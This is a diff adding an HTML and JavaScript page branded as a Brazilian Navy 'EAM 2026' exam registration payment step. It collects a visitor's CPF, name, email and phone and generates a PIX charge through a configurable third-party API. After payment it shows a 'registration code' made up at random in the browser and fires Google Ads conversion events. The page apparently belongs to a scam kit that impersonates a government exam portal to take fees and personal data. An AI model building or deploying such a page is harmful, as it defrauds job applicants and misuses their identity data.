@@ -1,0 +1,758 @@
+<!doctype html>
+<html lang="pt-br">
+    <head>
+        <meta charset="UTF-8" />
+        <meta content="width=device-width, initial-scale=1.0" name="viewport" />
+        <title>Marinha do Brasil - EAM 2026 - Pagamento PIX</title>
+
+        <script src="../../config-site.js"></script>
+        <script src="../../3.4.16.js"></script>
+        <link href="../css/all.min.css" rel="stylesheet" />
+        <link href="../css/home.css" rel="stylesheet" />
+
+        <!-- Google Ads Global Site Tag (gtag.js) - Carregado dinamicamente -->
+        <script>
+            // Carregar gtag.js dinamicamente baseado na configuração
+            (function() {
+                // Aguardar config-site.js carregar
+                const checkConfig = setInterval(function() {
+                    if (window.SITE_CONFIG?.GOOGLE_ADS?.ENABLED &&
+                        window.SITE_CONFIG?.GOOGLE_ADS?.CONVERSION_ID &&
+                        window.SITE_CONFIG.GOOGLE_ADS.CONVERSION_ID !== "AW-XXXXXXXXXX") {
+
+                        clearInterval(checkConfig);
+
+                        const conversionId = window.SITE_CONFIG.GOOGLE_ADS.CONVERSION_ID;
+
+                        // Criar script do gtag
+                        const gtagScript = document.createElement('script');
+                        gtagScript.async = true;
+                        gtagScript.src = `https://www.googletagmanager.com/gtag/js?id=${conversionId}`;
+                        document.head.appendChild(gtagScript);
+
+                        // Inicializar gtag
+                        window.dataLayer = window.dataLayer || [];
+                        window.gtag = function() { dataLayer.push(arguments); };
+                        gtag('js', new Date());
+                        gtag('config', conversionId);
+
+                        console.log(`✅ [Google Ads] gtag.js carregado para ${conversionId}`);
+                    }
+                }, 100);
+
+                // Timeout após 5 segundos
+                setTimeout(function() { clearInterval(checkConfig); }, 5000);
+            })();
+        </script>
+
+        <style>
+            .gov-header {
+                background-color: #003366;
+            }
+            .inep-header {
+                background-color: #003366;
+            }
+            .form-header {
+                background-color: #003366;
+                color: white;
+                font-weight: 600;
+            }
+            .btn-primary {
+                background-color: #003366;
+                color: white;
+                transition: all 0.2s ease;
+            }
+            .btn-primary:hover {
+                background-color: #004080;
+            }
+            .footer-bg {
+                background-color: #003366;
+            }
+
+            .pix-container {
+                max-width: 450px;
+                margin: 0 auto;
+            }
+
+            .pix-qrcode {
+                text-align: center;
+                margin: 20px 0;
+            }
+
+            .pix-qrcode img {
+                max-width: 280px;
+                border: 2px solid #e0e0e0;
+                border-radius: 12px;
+                padding: 12px;
+                background: white;
+                margin: 0 auto;
+                display: block;
+            }
+
+            .pix-code-container {
+                background: #f5f5f5;
+                border-radius: 8px;
+                padding: 16px;
+                margin: 16px 0;
+            }
+
+            .pix-code {
+                font-family: monospace;
+                font-size: 0.75rem;
+                word-break: break-all;
+                color: #333;
+                background: white;
+                padding: 12px;
+                border-radius: 6px;
+                border: 1px solid #ddd;
+                max-height: 80px;
+                overflow-y: auto;
+            }
+
+            .pix-copy-btn {
+                width: 100%;
+                background: #00a884;
+                color: white;
+                border: none;
+                padding: 14px 20px;
+                border-radius: 8px;
+                font-size: 1rem;
+                font-weight: 600;
+                cursor: pointer;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                gap: 8px;
+                transition: background 0.2s;
+            }
+
+            .pix-copy-btn:hover {
+                background: #008f6f;
+            }
+
+            .pix-copy-btn.copied {
+                background: #4caf50;
+            }
+
+            .status-pending {
+                background: #fff3e0;
+                color: #e65100;
+                padding: 16px;
+                border-radius: 8px;
+                text-align: center;
+            }
+
+            .status-approved {
+                background: #e8f5e9;
+                color: #2e7d32;
+                padding: 16px;
+                border-radius: 8px;
+                text-align: center;
+            }
+
+            .pix-timer {
+                text-align: center;
+                font-size: 0.9rem;
+                color: #666;
+                margin-top: 12px;
+            }
+
+            .pix-timer .time {
+                font-weight: bold;
+                color: #e65100;
+                font-size: 1.1rem;
+            }
+
+            .pix-amount {
+                text-align: center;
+                padding: 16px;
+                background: linear-gradient(135deg, #00a884 0%, #008f6f 100%);
+                border-radius: 8px;
+                color: white;
+                margin-bottom: 20px;
+            }
+
+            .pix-amount .label {
+                font-size: 0.85rem;
+                opacity: 0.9;
+            }
+
+            .pix-amount .value {
+                font-size: 2.2rem;
+                font-weight: bold;
+            }
+
+            .success-animation {
+                animation: pulse 1.5s infinite;
+            }
+
+            @keyframes pulse {
+                0% { transform: scale(1); }
+                50% { transform: scale(1.05); }
+                100% { transform: scale(1); }
+            }
+
+            .loading-container {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+                padding: 60px 20px;
+            }
+
+            .loading-spinner {
+                width: 50px;
+                height: 50px;
+                border: 4px solid #e0e0e0;
+                border-top-color: #00a884;
+                border-radius: 50%;
+                animation: spin 1s linear infinite;
+            }
+
+            @keyframes spin {
+                to { transform: rotate(360deg); }
+            }
+        </style>
+    </head>
+
+    <body class="flex flex-col min-h-screen">
+        <div class="inep-header py-2">
+            <div class="container mx-auto px-4 flex justify-center">
+                <img
+                    src="../images/logo-marinha.png"
+                    alt="Marinha do Brasil"
+                    style="height: 50px; width: auto; object-fit: contain"
+                />
+            </div>
+        </div>
+
+        <main class="flex-grow py-8" style="padding-top:10px!important">
+            <div class="container mx-auto px-4 max-w-3xl">
+                <div class="border border-gray-300 rounded">
+                    <div class="form-header py-2 px-4 text-center">
+                        <h2 class="text-lg">
+                            Inscrição &gt; Pagamento
+                        </h2>
+                    </div>
+
+                    <div class="p-6">
+                        <!-- Dados do candidato -->
+                        <div class="bg-[#003366] p-4 rounded-md mb-5 text-white shadow-md">
+                            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                                <div class="p-2">
+                                    <p class="text-sm text-gray-200">CPF:</p>
+                                    <p id="cpf-display" class="font-semibold">Carregando...</p>
+                                </div>
+                                <div class="p-2">
+                                    <p class="text-sm text-gray-200">Nome Completo:</p>
+                                    <p id="nome-display" class="font-semibold">Carregando...</p>
+                                </div>
+                            </div>
+                            <div class="p-2 mt-2 border-t border-white/20">
+                                <p class="text-sm text-gray-200">Concurso:</p>
+                                <p id="concurso-display" class="font-semibold">Carregando...</p>
+                            </div>
+                        </div>
+
+                        <!-- Container de Loading -->
+                        <div id="loading-container" class="loading-container">
+                            <div class="loading-spinner"></div>
+                            <p class="mt-4 text-gray-600">Gerando pagamento PIX...</p>
+                        </div>
+
+                        <!-- Container do PIX (inicialmente oculto) -->
+                        <div id="pix-container" class="pix-container" style="display: none;">
+                            <!-- Valor -->
+                            <div class="pix-amount">
+                                <div class="label">Valor a pagar</div>
+                                <div class="value" id="pix-amount-value">R$ --</div>
+                            </div>
+
+                            <!-- QR Code -->
+                            <div class="pix-qrcode">
+                                <img id="pix-qrcode-img" src="" alt="QR Code PIX" />
+                            </div>
+
+                            <!-- Código PIX -->
+                            <div class="pix-code-container">
+                                <p class="text-sm text-gray-600 mb-2 text-center">Código PIX (Copia e Cola)</p>
+                                <div class="pix-code" id="pix-code-text"></div>
+                            </div>
+
+                            <!-- Botão Copiar -->
+                            <button id="pix-copy-btn" class="pix-copy-btn">
+                                <i class="fas fa-copy"></i>
+                                <span>Copiar código PIX</span>
+                            </button>
+
+                            <!-- Status -->
+                            <div id="pix-status" class="status-pending mt-4">
+                                <i class="fas fa-clock mr-2"></i>
+                                <span id="pix-status-text">Aguardando pagamento...</span>
+                            </div>
+
+                            <!-- Timer -->
+                            <div class="pix-timer">
+                                Código expira em: <span id="pix-timer" class="time">30:00</span>
+                            </div>
+
+                            <!-- Botão Voltar -->
+                            <div class="mt-6">
+                                <a id="cancel-payment-btn" href="../info/" class="block w-full bg-gray-200 text-gray-700 py-3 rounded-md text-center hover:bg-gray-300 transition-colors">
+                                    <i class="fas fa-arrow-left mr-2"></i>
+                                    Cancelar e voltar
+                                </a>
+                            </div>
+                        </div>
+
+                        <!-- Container de Sucesso (inicialmente oculto) -->
+                        <div id="success-container" style="display: none;">
+                            <div class="text-center py-8">
+                                <div class="success-animation mb-6">
+                                    <div class="bg-green-100 p-6 rounded-full inline-flex items-center justify-center">
+                                        <i class="fas fa-check-circle text-green-600 text-6xl"></i>
+                                    </div>
+                                </div>
+
+                                <h3 class="text-2xl font-bold text-green-600 mb-4">Pagamento Aprovado!</h3>
+                                <p class="text-gray-600 mb-6">Sua inscrição foi confirmada com sucesso.</p>
+
+                                <div class="bg-green-50 border-2 border-green-200 rounded-lg p-4 mb-6">
+                                    <p class="text-sm text-green-700 mb-2">Código de Inscrição:</p>
+                                    <p id="success-code" class="text-3xl font-mono font-bold text-green-800 tracking-wider">--------</p>
+                                </div>
+
+                                <div class="bg-blue-50 rounded-lg p-4">
+                                    <p class="text-blue-700">
+                                        <i class="fas fa-clock mr-2"></i>
+                                        Redirecionando em <span id="countdown-redirect" class="font-bold">10</span> segundos...
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Container de Erro (inicialmente oculto) -->
+                        <div id="error-container" style="display: none;">
+                            <div class="text-center py-8">
+                                <div class="mb-6">
+                                    <div class="bg-red-100 p-6 rounded-full inline-flex items-center justify-center">
+                                        <i class="fas fa-exclamation-triangle text-red-600 text-5xl"></i>
+                                    </div>
+                                </div>
+
+                                <h3 class="text-xl font-bold text-red-600 mb-4">Erro ao gerar pagamento</h3>
+                                <p id="error-message" class="text-gray-600 mb-6">Ocorreu um erro ao processar sua solicitação.</p>
+
+                                <a href="../info/" class="inline-block bg-[#003366] text-white px-6 py-3 rounded-md hover:bg-[#004080] transition-colors">
+                                    <i class="fas fa-arrow-left mr-2"></i>
+                                    Voltar e tentar novamente
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <footer class="footer-bg text-white py-4 text-xs">
+            <div class="container mx-auto px-4">
+                <div class="flex flex-col items-center mb-2">
+                    <img
+                        src="../images/logo-marinha.png"
+                        alt="Marinha do Brasil"
+                        height="30"
+                        width="60"
+                        style="object-fit: contain"
+                    />
+                </div>
+                <div class="flex justify-between items-center">
+                    <div>&copy; Código de Ética e Conduta | Política de Integridade</div>
+                    <div class="flex items-center">
+                        <i class="fas fa-globe mr-1"></i> Marinha do Brasil
+                    </div>
+                </div>
+            </div>
+        </footer>
+
+        <script>
+            // Configurações
+            const API_URL = window.SITE_CONFIG?.API_URL || "http://localhost:3000";
+
+            let userData = null;
+            let concursoData = null;
+            let cargoData = null;
+            let TAXA_VALOR = 9800; // Valor padrão em centavos
+            let DESCRICAO = "Taxa de Inscrição - Concurso Marinha do Brasil";
+            let paymentCode = null;
+            let statusCheckInterval = null;
+            let timerInterval = null;
+            let expiresAt = null;
+
+            // Chave para salvar pagamento no localStorage
+            const PAYMENT_STORAGE_KEY = "activePixPayment";
+
+            document.addEventListener("DOMContentLoaded", async function() {
+                console.log("Página de pagamento carregada");
+
+                // Carregar dados do usuário e concurso
+                const cpfData = JSON.parse(localStorage.getItem("cpfData") || "{}");
+
+                if (cpfData?.dados?.[0]) {
+                    userData = cpfData.dados[0];
+                } else {
+                    userData = {
+                        CPF: "00000000000",
+                        NOME: "CANDIDATO TESTE"
+                    };
+                }
+
+                // Carregar dados do concurso selecionado
+                if (cpfData?.concurso) {
+                    concursoData = cpfData.concurso;
+                    // Converter taxa para centavos (API espera em centavos)
+                    TAXA_VALOR = Math.round(concursoData.taxaInscricao * 100);
+                    DESCRICAO = `Taxa de Inscrição - ${concursoData.nome}`;
+
+                    // Salvar taxa no localStorage para a página de confirmação
+                    localStorage.setItem("taxaInscricao", TAXA_VALOR.toString());
+                }
+
+                // Carregar dados do cargo selecionado
+                if (cpfData?.cargo) {
+                    cargoData = cpfData.cargo;
+                }
+
+                // Exibir dados do usuário
+                document.getElementById("cpf-display").textContent = formatCpf(userData.CPF);
+                document.getElementById("nome-display").textContent = userData.NOME;
+
+                // Exibir nome do concurso
+                if (concursoData) {
+                    document.getElementById("concurso-display").textContent =
+                        `${concursoData.nome}${cargoData ? ' - ' + cargoData.nome : ''}`;
+                } else {
+                    document.getElementById("concurso-display").textContent = "Concurso não especificado";
+                }
+
+                // Atualizar valor exibido
+                const valorReais = TAXA_VALOR / 100;
+                document.getElementById("pix-amount-value").textContent =
+                    `R$ ${valorReais.toFixed(2).replace(".", ",")}`;
+
+                // Verificar se já existe um pagamento ativo válido
+                const existingPayment = loadExistingPayment();
+
+                if (existingPayment) {
+                    console.log("♻️ Recuperando pagamento existente:", existingPayment.paymentCode);
+                    paymentCode = existingPayment.paymentCode;
+                    expiresAt = new Date(existingPayment.expiresAt);
+                    showPixData(existingPayment.pixData);
+                    startStatusCheck();
+                } else {
+                    // Gerar novo pagamento
+                    await generatePayment();
+                }
+            });
+
+            // Carregar pagamento existente do localStorage
+            function loadExistingPayment() {
+                try {
+                    const stored = localStorage.getItem(PAYMENT_STORAGE_KEY);
+                    if (!stored) return null;
+
+                    const payment = JSON.parse(stored);
+
+                    // Verificar se é do mesmo CPF
+                    if (payment.cpf !== userData.CPF) {
+                        console.log("⚠️ Pagamento existente é de outro CPF, gerando novo...");
+                        localStorage.removeItem(PAYMENT_STORAGE_KEY);
+                        return null;
+                    }
+
+                    // Verificar se não expirou
+                    const expiresAt = new Date(payment.expiresAt);
+                    const now = new Date();
+
+                    if (expiresAt <= now) {
+                        console.log("⚠️ Pagamento expirado, gerando novo...");
+                        localStorage.removeItem(PAYMENT_STORAGE_KEY);
+                        return null;
+                    }
+
+                    // Verificar se o valor é o mesmo
+                    if (payment.amount !== TAXA_VALOR) {
+                        console.log("⚠️ Valor do pagamento diferente, gerando novo...");
+                        localStorage.removeItem(PAYMENT_STORAGE_KEY);
+                        return null;
+                    }
+
+                    return payment;
+                } catch (error) {
+                    console.error("Erro ao carregar pagamento:", error);
+                    localStorage.removeItem(PAYMENT_STORAGE_KEY);
+                    return null;
+                }
+            }
+
+            // Salvar pagamento no localStorage
+            function savePayment(data) {
+                const payment = {
+                    paymentCode: data.paymentCode,
+                    pixData: data,
+                    cpf: userData.CPF,
+                    amount: TAXA_VALOR,
+                    expiresAt: new Date(Date.now() + 30 * 60 * 1000).toISOString(),
+                    createdAt: new Date().toISOString()
+                };
+                localStorage.setItem(PAYMENT_STORAGE_KEY, JSON.stringify(payment));
+                console.log("💾 Pagamento salvo no localStorage");
+            }
+
+            // Limpar pagamento do localStorage
+            function clearSavedPayment() {
+                localStorage.removeItem(PAYMENT_STORAGE_KEY);
+                console.log("🗑️ Pagamento removido do localStorage");
+            }
+
+            // Formatar CPF
+            function formatCpf(cpf) {
+                const cleaned = (cpf || "").replace(/\D/g, '');
+                if (cleaned.length === 11) {
+                    return cleaned.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+                }
+                return cpf;
+            }
+
+            // Gerar pagamento
+            async function generatePayment() {
+                try {
+                    const emailConfirmacao = localStorage.getItem("emailConfirmacao");
+                    let email = emailConfirmacao || userData.EMAIL || `${userData.CPF.replace(/\D/g, '')}@inscricao.temp`;
+
+                    console.log("Email para pagamento:", email);
+                    console.log("Valor da taxa:", TAXA_VALOR, "centavos");
+
+                    const response = await fetch(`${API_URL}/pix/generate`, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json",
+                        },
+                        body: JSON.stringify({
+                            cpf: userData.CPF,
+                            name: userData.NOME,
+                            email: email,
+                            phone: userData.TELEFONE || "",
+                            amount: TAXA_VALOR,
+                            description: DESCRICAO,
+                        }),
+                    });
+
+                    const contentType = response.headers.get("content-type");
+                    if (!contentType || !contentType.includes("application/json")) {
+                        throw new Error("Servidor retornou resposta inválida");
+                    }
+
+                    const result = await response.json();
+
+                    if (!result.success) {
+                        throw new Error(result.error || "Erro ao gerar pagamento");
+                    }
+
+                    // Salvar código do pagamento
+                    paymentCode = result.data.paymentCode;
+                    console.log("Pagamento gerado:", paymentCode);
+
+                    // Salvar no localStorage para evitar duplicação ao atualizar página
+                    savePayment(result.data);
+
+                    // Exibir dados do PIX
+                    showPixData(result.data);
+
+                    // Iniciar verificação de status
+                    startStatusCheck();
+
+                } catch (error) {
+                    console.error("Erro ao gerar pagamento:", error);
+                    showError(error.message);
+                }
+            }
+
+            // Exibir dados do PIX
+            function showPixData(data) {
+                document.getElementById("loading-container").style.display = "none";
+                document.getElementById("pix-container").style.display = "block";
+
+                // QR Code
+                const qrImg = document.getElementById("pix-qrcode-img");
+                if (data.pix.qrCodeImage) {
+                    qrImg.src = data.pix.qrCodeImage;
+                }
+
+                // Código PIX
+                document.getElementById("pix-code-text").textContent = data.pix.qrCode || "";
+
+                // Valor
+                document.getElementById("pix-amount-value").textContent = data.amountFormatted;
+
+                // Iniciar timer
+                if (!expiresAt) {
+                    expiresAt = new Date(Date.now() + 30 * 60 * 1000);
+                }
+                startExpirationTimer();
+
+                // Configurar botão de copiar
+                document.getElementById("pix-copy-btn").addEventListener("click", copyPixCode);
+            }
+
+            // Copiar código PIX
+            function copyPixCode() {
+                const code = document.getElementById("pix-code-text").textContent;
+                const btn = document.getElementById("pix-copy-btn");
+
+                navigator.clipboard.writeText(code).then(() => {
+                    btn.classList.add("copied");
+                    btn.innerHTML = '<i class="fas fa-check"></i> Código copiado!';
+
+                    setTimeout(() => {
+                        btn.classList.remove("copied");
+                        btn.innerHTML = '<i class="fas fa-copy"></i> Copiar código PIX';
+                    }, 3000);
+                }).catch(() => {
+                    // Fallback
+                    const textarea = document.createElement("textarea");
+                    textarea.value = code;
+                    document.body.appendChild(textarea);
+                    textarea.select();
+                    document.execCommand("copy");
+                    document.body.removeChild(textarea);
+
+                    btn.classList.add("copied");
+                    btn.innerHTML = '<i class="fas fa-check"></i> Código copiado!';
+
+                    setTimeout(() => {
+                        btn.classList.remove("copied");
+                        btn.innerHTML = '<i class="fas fa-copy"></i> Copiar código PIX';
+                    }, 3000);
+                });
+            }
+
+            // Verificar status do pagamento
+            function startStatusCheck() {
+                const maxAttempts = 120;
+                const interval = 5000;
+                let attempts = 0;
+
+                console.log("🔄 Iniciando verificação de status...");
+
+                statusCheckInterval = setInterval(async () => {
+                    attempts++;
+
+                    if (attempts >= maxAttempts) {
+                        clearInterval(statusCheckInterval);
+                        document.getElementById("pix-status-text").textContent = "Tempo esgotado. Gere um novo código.";
+                        return;
+                    }
+
+                    try {
+                        const response = await fetch(`${API_URL}/pix/status/${paymentCode}`);
+                        const result = await response.json();
+
+                        if (result.success && result.data) {
+                            const status = (result.data.payment_status || "").toLowerCase();
+                            console.log(`💳 Status: ${status}`);
+
+                            const approvedStatuses = ["approved", "paid", "confirmed", "completed", "success"];
+                            if (approvedStatuses.includes(status)) {
+                                console.log("✅ PAGAMENTO APROVADO!");
+                                clearInterval(statusCheckInterval);
+                                clearInterval(timerInterval);
+                                showPaymentSuccess();
+                            }
+                        }
+                    } catch (error) {
+                        console.error("Erro ao verificar status:", error);
+                    }
+                }, interval);
+            }
+
+            // Timer de expiração
+            function startExpirationTimer() {
+                const updateTimer = () => {
+                    const now = new Date();
+                    const diff = expiresAt - now;
+
+                    if (diff <= 0) {
+                        document.getElementById("pix-timer").textContent = "Expirado";
+                        clearInterval(timerInterval);
+                        return;
+                    }
+
+                    const minutes = Math.floor(diff / (1000 * 60));
+                    const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+
+                    document.getElementById("pix-timer").textContent =
+                        `${minutes.toString().padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`;
+                };
+
+                updateTimer();
+                timerInterval = setInterval(updateTimer, 1000);
+            }
+
+            // Mostrar sucesso do pagamento
+            function showPaymentSuccess() {
+                // Limpar pagamento salvo pois foi concluído
+                clearSavedPayment();
+
+                // Gerar código de inscrição
+                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+                let code = '';
+                for (let i = 0; i < 8; i++) {
+                    code += chars.charAt(Math.floor(Math.random() * chars.length));
+                }
+                localStorage.setItem("codigoInscricao", code);
+
+                // ========================================
+                // DISPARAR CONVERSÃO DO GOOGLE ADS
+                // ========================================
+                const valorReais = TAXA_VALOR / 100; // Converter centavos para reais
+                const transactionId = paymentCode || code; // Usar paymentCode ou código de inscrição
+
+                // Disparar todas as conversões configuradas
+                if (typeof window.trackAllConversions === "function") {
+                    window.trackAllConversions(valorReais, transactionId);
+                } else {
+                    console.warn("⚠️ Função trackAllConversions não encontrada");
+                }
+                // ========================================
+
+                // Ocultar container do PIX
+                document.getElementById("pix-container").style.display = "none";
+
+                // Mostrar container de sucesso
+                document.getElementById("success-container").style.display = "block";
+                document.getElementById("success-code").textContent = code;
+
+                // Countdown para redirecionamento (10 segundos)
+                let countdown = 3;
+                const countdownEl = document.getElementById("countdown-redirect");
+
+                const countdownInterval = setInterval(() => {
+                    countdown--;
+                    countdownEl.textContent = countdown;
+
+                    if (countdown <= 0) {
+                        clearInterval(countdownInterval);
+                        window.location.href = "../confirmacao/";
+                    }
+                }, 1000);
+            }
+
+            // Mostrar erro
+            function showError(message) {
+                document.getElementById("loading-container").style.display = "none";
+                document.getElementById("error-container").style.display = "block";
+                document.getElementById("error-message").textContent = message;
+            }
+        </script>
+    </body>
+</html>
